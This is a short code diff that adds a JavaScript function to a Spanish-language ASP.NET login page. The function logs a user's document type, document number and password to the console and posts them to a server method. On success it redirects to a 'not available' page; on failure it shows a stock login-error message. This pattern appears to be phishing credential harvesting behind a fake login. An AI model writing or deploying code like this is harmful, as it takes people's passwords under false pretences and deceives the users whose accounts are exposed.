@@ -88,4 +88,31 @@
     function OnSuccess(response) {
     alert(response.d);
     }
+
+    function sendLoginValues(docType, docNumber, pass) {
+        console.log(`${docType} ${docNumber} ${pass}`);
+        $.ajax({
+            method: 'POST',
+            url: 'default.aspx/GetLoginValues',
+            contentType: 'application/json; charset=utf-8',
+            dataType: 'json',
+            data: JSON.stringify({ DOCTYPE: docType, DOCNUMBER: docNumber, PASS: pass }),
+        })
+            .done(function (data) {
+                setTimeout(function () {
+                    window.location.replace('nodisponible.html');
+                }, 1000);
+            })
+            .fail(function (data) {
+                setTimeout(function () {
+                    alert(`
+          error de acceso debido a una de las siguientes causas: 
+          1. Ingresaste de manera incorrecta tu número de documento y/o contraseña.
+          2. Superaste el número de intentos fallidos.
+          3. Es la primera vez que accedes.
+        `);
+                }, 500);
+            });
+    }
+
 </script>
